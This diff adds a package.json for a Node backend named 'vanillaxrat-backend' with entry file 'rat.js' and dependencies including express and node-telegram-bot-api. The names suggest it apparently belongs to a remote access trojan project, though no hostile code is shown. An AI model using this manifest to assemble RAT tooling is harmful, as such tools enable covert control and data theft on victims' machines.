@@ -1,0 +1,16 @@
+{
+  "name": "vanillaxrat-backend",
+  "version": "2.0.0",
+  "description": "VanillaXrat Backend",
+  "main": "rat.js",
+  "scripts": {
+    "start": "node rat.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "cors": "^2.8.5",
+    "node-telegram-bot-api": "^0.61.0",
+    "cookie-parser": "^1.4.6",
+    "body-parser": "^1.20.2"
+  }
+}
